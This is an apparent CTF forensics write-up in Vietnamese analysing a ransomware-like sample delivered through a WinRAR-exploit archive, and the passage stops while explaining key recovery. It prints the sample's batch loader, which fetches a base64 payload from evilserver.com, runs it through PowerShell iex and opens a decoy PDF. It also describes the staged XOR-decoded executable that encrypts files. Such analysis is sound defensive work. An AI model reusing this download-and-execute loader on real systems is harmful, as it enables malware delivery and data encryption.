Chall : https://drive.google.com/file/d/1A6PQX4KitPRWyPzkN-8TVUZpShLzK2mD/view?usp=drive_link

Description: I received an email from an unidentified sender who described an intriguing world. Intrigued by their narrative, I followed the link in the email, downloaded a file, and attempted to open it. To my surprise, my essential documents were suddenly encrypted. I'm now in need of assistance to recover them.


----
Đề cho 1 file zip, chỉ cần mở ra nhìn đã dễ dàng nhận ra là con CVE winrar khá nổi gần đây :v, nhưng đã đổi thành zip extension. Mình sẽ vào folder bên trong và extract thẳng con bat file ra. Nội dung file bat:

```
@echo off
setlocal
set "ServerURL=http://evilserver.com:8080/useless.png"
for /f "delims=" %%i in ('curl -s -X GET "%ServerURL%"') do set response=%%i
powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%response%')) | iex"
Pancham.pdf
endlocal
```

Nó sẽ tải xuống useless.png, decode ra và iex để thực thi, sau đó pop up pdf để đánh lừa.

Decode nội dung và ta có được 1 script powershell bị obfuscate:

![image](https://github.com/NVex0/uWU/assets/113530029/1cacee44-d0a4-4075-9885-7076907e464e)

Mình dùng `PSDecode` để deobfuscate:

![image](https://github.com/NVex0/uWU/assets/113530029/842a0cb0-af31-4775-b9d6-1cd997c9d25e)

Code này sẽ thực hiện tải xuống con panpan.exe, mở file `final report` làm key xor và xor với các bytes trong panpan.exe (từ bytes thứ 1024, size xor là 31488). Sau khi xor thì sẽ thực thi con exe đầu ra.

Tuy nhiên ta không có file `final report`, mình ngồi thử với các header của file docx, pdf,....nhưng không khả quan. Nên khi mình load vào `pebear` cùng 1 vài sample PE 64 bit khác, mình để ý:

![image](https://github.com/NVex0/uWU/assets/113530029/61bdf04f-ae23-4596-9d66-749b23b84977)

Phần entry point của file này bắt đầu bằng 5 bytes 0, khá lạ, trong khi các file khác thì đều bắt đầu với dãy `48 83 EC 28 E8 F7 04 00 00 48 83 C4 28 E9 72 FE FF FF CC CC 40 53 48 83 EC 20 48 8B D9 33 C9 FF 15 BB 56 01 00 48 8B CB FF 15 AA 56 01 00 FF 15`, mình đem đi xor thử:

![image](https://github.com/NVex0/uWU/assets/113530029/07075e86-fee5-4a20-8c38-3dc7c254b054)

Để ý thấy `\x48\x83\xec\x28\xe8` lặp lại rất nhiều lần, mình đoán chắc rằng đây là xor key, mình xor thẳng lại với panpan.exe:

```
with open('PanCham.exe', 'rb') as f:
    fileb = f.read()

key = b"\x48\x83\xec\x28\xe8"
offset = 1024
size = 31488

with open("final.exe", "wb") as f:
    for i in range(len(fileb)):
        if i in range(offset, offset + size):
            f.write((fileb[i] ^ key[i % len(key)]).to_bytes(1, byteorder='big'))
        else:
            f.write(fileb[i].to_bytes(1, byteorder='big'))
```

Và load được vào ida mà không bị lỗi :v Nice. Mình tìm đến hàm main:

![image](https://github.com/NVex0/uWU/assets/113530029/ce10bc56-7731-4be1-86cf-15ee1ebc7633)

Sau 1 khoảng thời gian rất lâu đọc code:v, mình hiểu nó thực thi như sau:

1. GET data từ root của evilserver, sau đó dùng 1 hàm để decode base64. Data này dễ dàng thấy trong tcp stream 7.

2. xor decoded data ở trên với 8 bytes lấy từ file `version.txt`.

3. Dùng kết quả xor này, sẽ dùng để tạo key, iv,....các thứ, sau đó encrypt ảnh SensitiveData.png lại.

Vì không có file version.txt, ta buộc phải tự tìm lại key. Mình để ý tới hàm `CryptImportKey`, như bước thứ 3 mình nếu trên, kết quả của xor chính là dùng trong hàm này. hàm này sẽ phải khởi tạo PUBLICKEYSTRUC BLOB header trước, xong mới đến các thông tin khác. Dựa vào Blob, mình sẽ retrieve lại key như này:
